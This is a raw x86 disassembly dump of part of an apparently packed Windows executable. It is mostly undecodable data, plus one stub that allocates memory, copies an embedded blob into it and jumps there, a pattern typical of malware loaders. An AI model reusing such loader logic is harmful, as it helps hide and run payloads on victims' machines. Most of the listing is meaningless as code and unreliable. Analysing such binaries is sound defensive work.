  4163a7:	fstp   DWORD PTR [ecx]
  4163a9:	outs   dx,DWORD PTR ds:[esi]
  4163aa:	out    dx,eax
  4163ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ac:	inc    ecx
  4163ad:	in     eax,0xa8
  4163af:	cld    
  4163b0:	fs shl esi,1
  4163b3:	cwde   
  4163b4:	cmp    ecx,DWORD PTR [ebx+0x4c]
  4163b7:	jmp    0x1cf:0xe3bc5af
  4163be:	pop    esi
  4163bf:	adc    al,0xb1
  4163c1:	das    
  4163c2:	push   ds
  4163c3:	push   ecx
  4163c4:	push   eax
  4163c5:	cmp    DWORD PTR [ebx+0x443aaa9],edi
  4163cb:	sub    DWORD PTR [ebp+0x6e733660],esp
  4163d1:	push   esi
  4163d2:	lods   eax,DWORD PTR ds:[esi]
  4163d3:	stos   DWORD PTR es:[edi],eax
  4163d4:	xchg   DWORD PTR [ecx],esp
  4163d6:	retf   0x7a19
  4163d9:	jne    0x416364
  4163db:	(bad)  
  4163dc:	fucomp st(5)
  4163de:	in     eax,dx
  4163df:	push   esp
  4163e0:	ror    bh,0x7d
  4163e3:	shl    BYTE PTR [edx-0xa],0x27
  4163e7:	rol    BYTE PTR [esi],cl
  4163e9:	push   0x2ff3b1e3
  4163ee:	aas    
  4163ef:	fucomip st,st(2)
  4163f1:	xor    BYTE PTR [ebx],0x5a
  4163f4:	lock add cl,BYTE PTR [edx+esi*4]
  4163f8:	dec    edx
  4163f9:	mov    ebp,0xfd1b13c7
  4163fe:	and    bl,bh
  416400:	out    dx,eax
  416401:	xor    ecx,DWORD PTR [eax-0x1a]
  416404:	test   al,0x6b
  416406:	in     eax,0xbd
  416408:	mov    dh,0xa2
  41640a:	fistp  QWORD PTR [ecx+0x79]
  41640d:	ins    BYTE PTR es:[edi],dx
  41640e:	stos   BYTE PTR es:[edi],al
  41640f:	mov    edi,0xebe11e58
  416414:	jae    0x416460
  416416:	mov    ds:0xc0f8678b,eax
  41641b:	mov    ds:0xa0b4deb7,eax
  416420:	or     edi,DWORD PTR [eax]
  416422:	add    eax,0x8e56d409
  416427:	dec    edx
  416428:	fldenv [edi]
  41642a:	out    0x56,eax
  41642c:	jle    0x416408
  41642e:	aas    
  41642f:	jb     0x4163e4
  416431:	jl     0x4163b6
  416433:	pop    ds
  416434:	(bad)  
  416435:	jae    0x416462
  416437:	nop
  416438:	mov    ebx,0x763b3cd2
  41643d:	mov    al,0x8
  41643f:	push   edx
  416440:	aad    0xe9
  416442:	jae    0x41645f
  416444:	or     edx,ecx
  416446:	inc    ecx
  416447:	xor    bl,BYTE PTR [edi]
  416449:	dec    eax
  41644a:	aad    0xf8
  41644c:	jp     0x41640a
  41644e:	fld    DWORD PTR [ebx+esi*2+0x4]
  416452:	and    ch,dh
  416454:	into   
  416455:	mov    cl,0x55
  416457:	hlt    
  416458:	aad    0x50
  41645a:	test   eax,0xaeb6af82
  41645f:	or     al,0xb3
  416461:	in     eax,0x21
  416463:	aas    
  416464:	and    al,0x82
  416466:	mov    DWORD PTR [ecx],0x1349b876
  41646c:	loopne 0x416419
  41646e:	adc    al,0x91
  416470:	or     eax,eax
  416472:	add    al,0x91
  416474:	add    ebp,eax
  416476:	lock (bad) 
  416478:	retf   0xc7c3
  41647b:	fidiv  WORD PTR [ecx+0x41]
  41647e:	into   
  41647f:	xor    al,ah
  416481:	fnstcw WORD PTR [ecx-0x19]
  416484:	jno    0x41645a
  416486:	pop    ebp
  416487:	sbb    DWORD PTR [ebp-0x2c51892a],esp
  41648d:	addr16 xchg ebx,eax
  41648f:	fisub  DWORD PTR [edi]
  416491:	push   0x46622535
  416496:	ror    ah,1
  416498:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41649a:	sub    al,0x9c
  41649c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41649d:	je     0x41645b
  41649f:	mov    eax,0x561a3d75
  4164a4:	jp     0x416515
  4164a6:	adc    eax,0x43b56ed8
  4164ab:	stc    
  4164ac:	gs jp  0x416471
  4164af:	jae    0x41648b
  4164b1:	jecxz  0x41643f
  4164b3:	mov    ch,0x15
  4164b5:	(bad)  
  4164b6:	cs sub al,0x29
  4164b9:	xchg   edx,eax
  4164ba:	ss sbb eax,0xba63704b
  4164c0:	dec    edi
  4164c1:	lods   eax,DWORD PTR ds:[esi]
  4164c2:	out    0x4f,al
  4164c4:	jmp    0x41647b
  4164c6:	sahf   
  4164c7:	test   eax,0xb83a1a0e
  4164cc:	aad    0x52
  4164ce:	jne    0x416491
  4164d0:	loopne 0x4164d1
  4164d2:	retf   0xaead
  4164d5:	loope  0x4164ab
  4164d7:	mov    edi,0xf0aa3ed5
  4164dc:	inc    DWORD PTR [edx-0x5a]
  4164df:	and    DWORD PTR [ecx-0x7a],edi
  4164e2:	stos   DWORD PTR es:[edi],eax
  4164e3:	mov    DWORD PTR [ecx-0x49694ec9],ebp
  4164e9:	in     al,0x36
  4164eb:	add    edi,DWORD PTR [ebx]
  4164ed:	ss xor al,0xfd
  4164f0:	jns    0x416554
  4164f2:	out    dx,eax
  4164f3:	in     eax,0xeb
  4164f5:	iret   
  4164f6:	inc    edi
  4164f7:	pop    esi
  4164f8:	in     eax,0x47
  4164fa:	mov    eax,ds:0xaa7c8054
  4164ff:	adc    eax,0x3bbb51e7
  416504:	in     eax,0x19
  416506:	and    al,0xf3
  416508:	nop
  416509:	sbb    DWORD PTR [ecx-0x78],edx
  41650c:	nop
  41650d:	mov    cl,0xc3
  41650f:	push   eax
  416510:	cmp    DWORD PTR [esp+ecx*1+0x63317661],edi
  416517:	aad    0x3d
  416519:	fwait
  41651a:	adc    dl,BYTE PTR [ecx]
  41651c:	pop    ss
  41651d:	dec    eax
  41651e:	inc    esi
  41651f:	ds hlt 
  416521:	cs adc eax,0xebe614bc
  416527:	pop    ss
  416528:	mov    ds:0x931e9e59,eax
  41652d:	mul    BYTE PTR [edx]
  41652f:	pop    ebp
  416530:	mov    eax,0x3b4dbb8
  416535:	retf   
  416536:	mov    ebp,0x646bb5de
  41653b:	dec    ecx
  41653c:	mov    DWORD PTR [ebp-0x57898cdc],ebp
  416542:	fidivr WORD PTR [esi-0x1a80089f]
  416548:	xchg   esp,eax
  416549:	or     DWORD PTR [esi+ecx*1],ebx
  41654c:	mov    ah,0x41
  41654e:	lock call 0x2ce6e9ce
  416554:	dec    esp
  416555:	mov    ebx,0xbd4f063b
  41655a:	pusha  
  41655b:	clc    
  41655c:	sbb    al,0xdf
  41655e:	jmp    0x4165c6
  416560:	stos   BYTE PTR es:[edi],al
  416561:	mov    ds:0xdb173b50,al
  416566:	hlt    
  416567:	lahf   
  416568:	pop    ds
  416569:	jns    0x41654e
  41656b:	jo     0x41652d
  41656d:	pushf  
  41656e:	or     DWORD PTR [edi-0x73849483],0xffffff8f
  416575:	inc    ecx
  416576:	and    BYTE PTR [ecx+0x587266e0],cl
  41657c:	adc    eax,0x223519c6
  416581:	mov    ah,BYTE PTR [ecx]
  416583:	xor    esp,esi
  416585:	pusha  
  416586:	mov    gs,WORD PTR [ebx+0x199981f7]
  41658c:	adc    al,cl
  41658e:	shl    BYTE PTR fs:[ecx-0x37],cl
  416592:	ret    0x794c
  416595:	push   DWORD PTR [ebp+eiz*4+0x26c12e23]
  41659c:	sti    
  41659d:	imul   esi,DWORD PTR [edx],0xc
  4165a0:	dec    edi
  4165a1:	js     0x416532
  4165a3:	cmp    esp,DWORD PTR [ebx-0x14f6bbc2]
  4165a9:	pmovmskb ebp,mm3
  4165ac:	mov    ebp,0x630be125
  4165b1:	xchg   si,ax
  4165b3:	(bad)  
  4165b5:	mov    ch,0x42
  4165b7:	out    dx,al
  4165b8:	inc    esi
  4165b9:	fstp   TBYTE PTR [esi]
  4165bb:	enter  0x1ad8,0x50
  4165bf:	sbb    cl,dh
  4165c1:	and    ch,BYTE PTR [edi]
  4165c3:	xchg   ecx,eax
  4165c4:	push   cs
  4165c5:	out    0x47,al
  4165c7:	dec    DWORD PTR [eax+0x54]
  4165ca:	cmp    eax,0x26dc3a08
  4165cf:	sbb    eax,0xeaeed9fc
  4165d4:	xchg   BYTE PTR [ecx],cl
  4165d6:	and    ch,BYTE PTR [edi+0x3e]
  4165d9:	adc    edx,ebp
  4165db:	call   0xc772a44f
  4165e0:	aaa    
  4165e1:	add    DWORD PTR [ebp+0x17],ecx
  4165e4:	btc    DWORD PTR [edx+0x4d],esi
  4165e8:	fucomi st,st(4)
  4165ea:	stos   BYTE PTR es:[edi],al
  4165eb:	mov    eax,0x4e1907f3
  4165f0:	aam    0xa9
  4165f2:	paddsw mm5,QWORD PTR [ebx+0x61]
  4165f6:	ret    0xf6c9
  4165f9:	fdivr  st,st(4)
  4165fb:	outs   dx,DWORD PTR ds:[esi]
  4165fc:	xchg   ebx,eax
  4165fd:	aam    0xe3
  4165ff:	fxch   st(4)
  416601:	and    eax,0x94e5f46a
  416606:	gs sub al,0x9d
  416609:	(bad)  
  41660a:	push   ecx
  41660b:	(bad)  
  41660c:	cmp    edx,DWORD PTR [eax]
  41660e:	add    ch,bl
  416610:	mov    ebx,0xee34813
  416615:	push   ecx
  416616:	(bad)  
  416618:	fadd   DWORD PTR [ebx-0x113500c4]
  41661e:	popa   
  41661f:	cwde   
  416620:	das    
  416621:	or     al,ah
  416623:	or     ah,BYTE PTR [esi+0x11a94b15]
  416629:	mov    al,0xb4
  41662b:	mov    ss,WORD PTR [eax+0x1373042b]
  416631:	sbb    DWORD PTR [edi+0xffcf4b9],edi
  416637:	mov    bl,0xcd
  416639:	sub    bl,BYTE PTR [ebp+ebp*8+0x49e69133]
  416640:	add    BYTE PTR [edx+0x6f],bh
  416643:	dec    eax
  416644:	or     ebx,ecx
  416646:	std    
  416647:	jbe    0x4165f6
  416649:	fild   WORD PTR [ebx+0x6c61becb]
  41664f:	sbb    edx,ebx
  416651:	leave  
  416652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416653:	imul   eax,DWORD PTR [edi],0x4ee53b04
  416659:	fdiv   DWORD PTR [edi]
  41665b:	mov    cl,0xd6
  41665d:	std    
  41665e:	jnp    0x416603
  416660:	mov    ds:0x735ad673,eax
  416665:	call   edi
  416667:	mov    WORD PTR [edx],es
  416669:	xor    eax,0x83caecca
  41666e:	test   eax,0x81b24269
  416674:	adc    ebp,DWORD PTR [eax+esi*8+0x5b]
  416678:	pop    esi
  416679:	(bad)  
  41667a:	or     DWORD PTR [eax+0x13],edx
  41667d:	imul   eax,DWORD PTR [esi],0x147d691f
  416683:	sub    esp,esi
  416685:	int    0x74
  416687:	nop
  416688:	pop    ecx
  416689:	push   edi
  41668a:	dec    esi
  41668b:	push   es
  41668c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41668d:	mov    esp,0x7df58121
  416692:	jb     0x4166fb
  416694:	jg     0x41669b
  416696:	mov    cl,0x72
  416698:	pop    ebp
  416699:	xchg   esp,eax
  41669a:	cmp    al,0x6d
  41669c:	inc    esp
  41669d:	das    
  41669e:	xchg   ebx,eax
  41669f:	aam    0xe3
  4166a1:	mov    al,0x81
  4166a3:	jno    0x416706
  4166a5:	mov    ecx,0x8119cb9f
  4166aa:	call   0xa244:0xdb1a22df
  4166b1:	xchg   esp,eax
  4166b2:	xchg   dh,dh
  4166b4:	jbe    0x4166e0
  4166b6:	xchg   esi,eax
  4166b7:	push   edx
  4166b8:	and    bh,BYTE PTR [eax+0x3308dad6]
  4166be:	repz jne 0x4166cc
  4166c1:	add    edx,DWORD PTR [esi-0x38]
  4166c4:	pop    ecx
  4166c5:	push   0x0
  4166c7:	arpl   WORD PTR [edx+ebp*1],bx
  4166ca:	aad    0x9a
  4166cc:	sbb    esp,DWORD PTR [ecx+0x71084d20]
  4166d2:	sbb    al,0xd6
  4166d4:	(bad)  
  4166d5:	fnstcw WORD PTR [ecx-0x12]
  4166d8:	dec    ebx
  4166d9:	jnp    0x4166c9
  4166db:	arpl   WORD PTR [ecx+0x1f],bx
  4166de:	inc    edi
  4166df:	call   DWORD PTR [edi-0x58d66e75]
  4166e5:	adc    eax,DWORD PTR [esi-0x16]
  4166e8:	pop    ds
  4166e9:	and    eax,0xe93916d6
  4166ee:	jbe    0x4166ab
  4166f0:	or     ebx,edx
  4166f2:	and    esp,DWORD PTR [ecx]
  4166f4:	mov    bl,0x58
  4166f6:	test   al,0xb8
  4166f8:	ror    bh,cl
  4166fa:	inc    ebp
  4166fb:	popa   
  4166fc:	dec    edx
  4166fd:	mov    ds:0x8faf87f6,eax
  416702:	ja     0x4166d6
  416704:	dec    ecx
  416705:	inc    esi
  416706:	mov    esp,0x63bf666b
  41670b:	ins    DWORD PTR es:[edi],dx
  41670c:	push   ss
  41670d:	push   eax
  41670e:	mov    bl,0xab
  416710:	pop    esi
  416711:	mov    edx,0x15556efb
  416716:	xor    ecx,ebx
  416718:	mov    cl,0x19
  41671a:	shl    BYTE PTR [esi],1
  41671c:	xlat   BYTE PTR ds:[ebx]
  41671d:	push   esi
  41671e:	loopne 0x416774
  416720:	in     al,dx
  416721:	out    dx,eax
  416722:	jbe    0x41676a
  416724:	push   edi
  416725:	fistp  DWORD PTR [esi]
  416727:	in     al,0xa8
  416729:	out    dx,eax
  41672a:	call   0x419fb471
  41672f:	call   0x4ef8:0x15f14227
  416736:	es mov ebp,0x532d1abb
  41673c:	pop    ss
  41673d:	or     BYTE PTR [si-0x8],al
  416741:	pop    ss
  416742:	mov    ebx,0xb88ea55a
  416747:	push   es
  416748:	mov    edi,ebp
  41674a:	pop    ss
  41674b:	dec    esi
  41674c:	xchg   edi,eax
  41674d:	loope  0x416752
  41674f:	int    0x4b
  416751:	mov    ch,0x12
  416753:	ret    0x4a0f
  416756:	imul   ebx,DWORD PTR [edx+0x37],0xc
  41675a:	jo     0x416784
  41675c:	jmp    0x6e8d:0x5e4a473b
  416763:	test   dl,ch
  416765:	xor    al,bh
  416767:	les    edx,FWORD PTR [eax]
  416769:	xchg   esi,eax
  41676a:	xchg   DWORD PTR [edi],ebp
  41676c:	jmp    0x125a69dc
  416771:	dec    edi
  416772:	addr16 mov ebp,0xd3a38a9e
  416778:	dec    edi
  416779:	pop    ss
  41677a:	jp     0x4167db
  41677c:	adc    al,0x60
  41677e:	jbe    0x416769
  416780:	lock mov edx,0xc1873445
  416786:	jecxz  0x4167d9
  416788:	test   cl,0x88
  41678b:	jo     0x41679b
  41678d:	push   0x9
  41678f:	nop
  416790:	cmp    DWORD PTR [edx],eax
  416792:	(bad)  
  416793:	mov    eax,ds:0xc9fa5f47
  416798:	pop    ebp
  416799:	xchg   dx,ax
  41679b:	sbb    bl,dh
  41679d:	leave  
  41679e:	mov    bl,0x8a
  4167a0:	add    esi,ecx
  4167a2:	or     bl,BYTE PTR [edi+0x76]
  4167a5:	adc    BYTE PTR [ecx+edx*4-0x43fbb448],dl
  4167ac:	in     al,dx
  4167ad:	dec    ebp
  4167ae:	inc    eax
  4167af:	call   DWORD PTR [edi]
  4167b1:	int3   
  4167b2:	sub    DWORD PTR [ebp-0x18],edi
  4167b5:	call   DWORD PTR ds:0x418014
  4167bb:	mov    DWORD PTR [ebp-0x2c],eax
  4167be:	movzx  eax,WORD PTR [ebp-0x2c]
  4167c2:	cmp    eax,0x539
  4167c7:	jne    0x4167f8
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0x4e2ef206
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
  4168be:	push   DWORD PTR [ebp-0x6c]
  4168c1:	mov    ecx,DWORD PTR [ebp-0x5c]
  4168c4:	push   ecx
  4168c5:	jmp    ecx
  4168c7:	jmp    0x4168cf
  4168c9:	mov    ecx,DWORD PTR [ebp+0x8]
  4168cc:	mov    DWORD PTR [ebp-0x18],ecx
  4168cf:	mov    eax,0x1
  4168d4:	pop    ebx
  4168d5:	mov    esp,ebp
  4168d7:	pop    ebp
  4168d8:	ret    
  4168d9:	push   ebp
  4168da:	mov    ebp,esp
  4168dc:	pop    ebp
  4168dd:	ret    
  4168de:	push   ebp
  4168df:	mov    ebp,esp
  4168e1:	sub    esp,0x54
  4168e4:	mov    DWORD PTR [ebp-0x34],0x0
  4168eb:	mov    DWORD PTR [ebp-0x4],0x0
  4168f2:	mov    DWORD PTR [ebp-0x50],0x0
  4168f9:	mov    DWORD PTR [ebp-0x4c],0x0
  416900:	mov    DWORD PTR [ebp-0x30],0x0
  416907:	lea    eax,[ebp-0x38]
  41690a:	push   eax
  41690b:	push   0x8
  41690d:	call   DWORD PTR ds:0x418020
  416913:	call   DWORD PTR ds:0x418014
  416919:	mov    DWORD PTR [ebp-0x30],eax
  41691c:	lea    ecx,[ebp-0x48]
  41691f:	push   ecx
  416920:	call   DWORD PTR ds:0x418010
  416926:	mov    edx,DWORD PTR [ebp-0x34]
  416929:	push   edx
  41692a:	call   0x416959
  41692f:	add    esp,0x4
  416932:	call   0x417e25
  416937:	mov    DWORD PTR [ebp-0x54],0x0
  41693e:	jmp    0x416949
  416940:	mov    eax,DWORD PTR [ebp-0x54]
  416943:	add    eax,0x1
  416946:	mov    DWORD PTR [ebp-0x54],eax
  416949:	cmp    DWORD PTR [ebp-0x54],0x64
  41694d:	jae    0x416951
  41694f:	jmp    0x416940
  416951:	xor    eax,eax
  416953:	mov    esp,ebp
  416955:	pop    ebp
  416956:	ret    0x10
  416959:	push   ebp
  41695a:	mov    ebp,esp
  41695c:	sub    esp,0x40
  41695f:	push   esi
  416960:	mov    DWORD PTR [ebp-0x40],0x0
  416967:	mov    DWORD PTR [ebp-0x3c],0x0
  41696e:	mov    DWORD PTR [ebp-0x34],0x0
  416975:	mov    DWORD PTR [ebp-0x28],0x0
  41697c:	mov    DWORD PTR [ebp-0x20],0x0
  416983:	mov    DWORD PTR [ebp-0x2c],0x0
  41698a:	mov    DWORD PTR [ebp-0x30],0x449e28
  416991:	mov    DWORD PTR [ebp-0x28],0x672f522
  416998:	mov    DWORD PTR [ebp-0x38],0x0
  41699f:	mov    eax,DWORD PTR [ebp-0x28]
  4169a2:	mov    DWORD PTR [ebp-0x24],eax
  4169a5:	mov    DWORD PTR [ebp-0x4],0x0
  4169ac:	mov    ecx,DWORD PTR ds:0x418014
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	push   0x0
  4169b7:	push   0x4e
  4169b9:	push   0x1e
  4169bb:	push   0x0
  4169bd:	push   0xffffffff
  4169bf:	call   DWORD PTR ds:0x41801c
  4169c5:	test   eax,eax
  4169c7:	je     0x417e04
  4169cd:	sbb    cl,dh
  4169cf:	loope  0x4169a3
  4169d1:	outs   dx,BYTE PTR ds:[esi]
  4169d2:	fild   DWORD PTR [edx]
  4169d4:	fucomi st,st(4)
  4169d6:	(bad)  [eax-0x6b57ae1a]
  4169dc:	jno    0x416a48
  4169de:	ins    DWORD PTR es:[edi],dx
  4169df:	fild   DWORD PTR [edx]
  4169e1:	fucomi st,st(0)
  4169e3:	(bad)  [eax-0x6ba8515a]
  4169e9:	jno    0x4169bd
  4169eb:	ins    DWORD PTR es:[edi],dx
  4169ec:	fild   DWORD PTR [edx]
  4169ee:	fucomi st,st(0)
  4169f0:	(bad)  [eax-0x6ba8511a]
  4169f6:	jno    0x4169ca
  4169f8:	ins    DWORD PTR es:[edi],dx
  4169f9:	fild   DWORD PTR [edx]
  4169fb:	fucomi st,st(0)
  4169fd:	(bad)  [eax-0x6ba8511a]
  416a03:	jno    0x4169d7
  416a05:	ins    DWORD PTR es:[edi],dx
  416a06:	fild   DWORD PTR [edx]
  416a08:	fneni(8087 only) 
  416a0a:	fisub  DWORD PTR [eax+0x2e48a0e6]
  416a10:	jg     0x4169e4
  416a12:	(bad)  
  416a14:	iret   
  416a15:	cli    
  416a16:	push   eax
  416a17:	(bad)  
  416a19:	sub    ecx,DWORD PTR [edi-0x5ee703fd]
  416a1f:	dec    ebp
  416a20:	stos   DWORD PTR es:[edi],eax
  416a21:	jo     0x4169d7
  416a23:	(bad)
  416a27:	mov    ?,WORD PTR [esi*8-0x50fd43e1]
  416a2e:	and    bh,BYTE PTR [ecx-0x6c2d0473]
  416a34:	shl    BYTE PTR [edi-0x3],0x1f
  416a38:	repnz sub DWORD PTR [ecx+edx*2-0x3b4b7a05],edx
  416a40:	add    DWORD PTR [eax-0x98466a6],0x6d
  416a47:	fild   DWORD PTR [edx]
  416a49:	fucomi st,st(0)
  416a4b:	(bad)  [eax+0x1a41619c]
  416a51:	dec    edi
  416a52:	jl     0x416a69
  416a54:	push   es
  416a55:	cmp    al,0x75
  416a57:	nop
  416a58:	push   es
  416a59:	sahf   
  416a5a:	dec    eax
  416a5b:	(bad)  
  416a5c:	mov    dh,BYTE PTR [ecx-0x64fcbbe]
  416a62:	lods   al,BYTE PTR ds:[esi]
  416a63:	mov    ds:0x3493fe35,eax
  416a68:	jae    0x416a52
  416a6a:	cmp    cl,BYTE PTR [ecx]
  416a6c:	cmovs  ebp,eax
  416a6f:	rol    DWORD PTR [esi],1
  416a71:	std    
  416a72:	jne    0x416a4c
  416a74:	cmp    edi,edi
  416a76:	pop    DWORD PTR [edi-0x54]
  416a79:	jmp    0xed210e41
  416a7e:	and    BYTE PTR ds:[ebp-0x2f],bh
  416a82:	add    BYTE PTR [edi],ch
  416a84:	dec    ecx
  416a85:	inc    esi
  416a86:	add    al,0x86
  416a88:	push   es
  416a89:	daa    
  416a8a:	jne    0x416a1c
  416a8c:	push   es
  416a8d:	sahf   
  416a8e:	dec    eax
  416a8f:	xlat   BYTE PTR ds:[ebx]
  416a90:	mov    bl,ch
  416a92:	fisubr WORD PTR [edx-0x4e73e650]
  416a98:	xor    eax,0x739e0eeb
  416a9d:	jb     0x416a46
  416a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa0:	unpcklps xmm6,XMMWORD PTR [ebp+0x7a]
  416aa4:	push   es
  416aa5:	int    0xe8
  416aa7:	inc    edx
  416aa8:	cmp    edx,DWORD PTR [ecx-0x8531307]
  416aae:	pop    esi
  416aaf:	ds (bad) 
  416ab2:	inc    esi
  416ab3:	mov    ds:0x34c7b47d,eax
  416ab8:	cld    
  416ab9:	dec    edi
  416aba:	jl     0x416ad1
  416abc:	push   es
  416abd:	add    bl,bl
  416abf:	call   0xaf280b9f
  416ac4:	push   edi
  416ac5:	xchg   esp,eax
  416ac6:	jno    0x416a9a
  416ac8:	ins    DWORD PTR es:[edi],dx
  416ac9:	fild   DWORD PTR [edx]
  416acb:	fucomi st,st(0)
  416acd:	(bad)  [eax-0x6ba8511a]
  416ad3:	jno    0x416aa7
  416ad5:	cmp    eax,0xa4db029e
  416ada:	fisub  DWORD PTR [ebx-0x26e6371a]
  416ae0:	shr    BYTE PTR ds:[ebp-0x25],cl
  416ae4:	add    bl,bl
  416ae6:	call   0xae480bc6
  416aeb:	push   ebp
  416aec:	xchg   ebp,eax
  416aed:	jp     0x416ac2
  416aef:	fild   DWORD PTR [bp+si]
  416af2:	cmp    esp,ebp
  416af4:	(bad)  [eax-0x6ba8579e]
  416afa:	jno    0x416ace
  416afc:	ins    DWORD PTR es:[edi],dx
  416afd:	cwde   
  416afe:	mov    edi,0xb0dbe8db
  416b03:	out    0xae,al
  416b05:	push   edi
  416b06:	xchg   esp,eax
  416b07:	je     0x416adb
  416b09:	ins    DWORD PTR es:[edi],dx
  416b0a:	fild   DWORD PTR [edx-0x25]
  416b0d:	call   0xaf280bdd
  416b12:	push   ebp
  416b13:	xchg   esp,eax
  416b14:	jno    0x416aed
  416b16:	ins    DWORD PTR es:[edi],dx
  416b17:	fiadd  DWORD PTR [edx]
  416b19:	fucomi st,st(0)
  416b1b:	(bad)  [eax-0x6ba9511d]
  416b21:	jno    0x416af5
  416b23:	ins    DWORD PTR es:[edi],dx
  416b24:	fild   DWORD PTR [edx]
  416b26:	jmp    0x416b0c
  416b28:	(bad)  [eax-0x61a8511e]
  416b2e:	(bad)  
  416b2f:	(bad)  
  416b30:	ins    DWORD PTR es:[edi],dx
  416b31:	fld    DWORD PTR [edx]
  416b33:	fwait
  416b34:	imul   ebx,ebx,0x57aef6a0
  416b3a:	test   BYTE PTR [ecx-0x2e],dh
  416b3d:	ins    DWORD PTR es:[edi],dx
  416b3e:	fist   DWORD PTR [edx]
  416b40:	fucomi st,st(0)
  416b42:	retf   
  416b43:	mov    al,ds:0x9457aee6
  416b48:	jno    0x416b0c
  416b4a:	ins    DWORD PTR es:[edi],dx
  416b4b:	fild   DWORD PTR [edx]
  416b4d:	fucomi st,st(0)
  416b4f:	(bad)  [eax-0x6ba8511a]
  416b55:	jne    0x416b29
  416b57:	popa   
  416b58:	fistp  DWORD PTR [ebx-0x28]
  416b5b:	call   0xa5680c3b
  416b60:	push   edi
  416b61:	ror    DWORD PTR [esi-0x2e],0x6d
  416b65:	fild   DWORD PTR [edx]
  416b67:	fucomi st,st(0)
  416b69:	(bad)  [eax-0x6ba8511a]
  416b6f:	jno    0x416b43
  416b71:	ins    DWORD PTR es:[edi],dx
  416b72:	fild   DWORD PTR [edx]
  416b74:	fucomi st,st(0)
  416b76:	sti    
  416b77:	lods   al,BYTE PTR ds:[esi]
  416b78:	out    0xb6,al
  416b7a:	push   edi
  416b7b:	xchg   esp,eax
  416b7c:	jno    0x416b50
  416b7e:	ins    DWORD PTR es:[edi],dx
  416b7f:	fild   DWORD PTR [edx]
  416b81:	fucomi st,st(0)
  416b83:	(bad)  [eax-0x6ba8511a]
  416b89:	jno    0x416b5d
  416b8b:	ins    DWORD PTR es:[edi],dx
  416b8c:	fild   DWORD PTR [edx]
  416b8e:	fucomi st,st(0)
  416b90:	(bad)  [eax-0x6ba8511a]
  416b96:	jno    0x416b6a
  416b98:	ins    DWORD PTR es:[edi],dx
  416b99:	fild   DWORD PTR [edx]
  416b9b:	fucomi st,st(0)
  416b9d:	(bad)  [eax-0x6ba8511a]
  416ba3:	jno    0x416b77
  416ba5:	ins    DWORD PTR es:[edi],dx
  416ba6:	fild   DWORD PTR [edx]
  416ba8:	fucomi st,st(0)
  416baa:	(bad)  [eax-0x6ba8511a]
  416bb0:	jno    0x416b84
  416bb2:	ins    DWORD PTR es:[edi],dx
  416bb3:	fild   DWORD PTR [edx]
  416bb5:	fucomi st,st(0)
  416bb7:	(bad)  [eax-0x6ba8511a]
  416bbd:	jno    0x416b91
  416bbf:	ins    DWORD PTR es:[edi],dx
  416bc0:	fild   DWORD PTR [edx]
  416bc2:	fucomi st,st(0)
